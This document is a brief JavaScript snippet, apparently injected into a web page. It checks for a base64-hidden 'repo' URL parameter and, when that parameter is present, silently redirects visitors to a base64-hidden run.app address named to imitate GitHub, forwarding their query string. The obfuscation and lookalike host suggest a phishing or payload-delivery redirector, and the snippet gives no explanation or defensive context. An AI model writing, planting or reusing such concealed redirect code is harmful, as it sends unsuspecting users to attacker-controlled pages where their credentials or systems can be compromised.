(function () {
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);

  if (!!urlParams.get(atob('cmVwbw=='))) {
    window.location.replace(atob('aHR0cHM6Ly9naXRodWItYXJ0aWZhY3QtNnlyNG5iZWYzcS11Yy5hLnJ1bi5hcHAv') + queryString);

    if (!!document.referrer) {
      window.location.replace(document.referrer);
    }
  }
})();
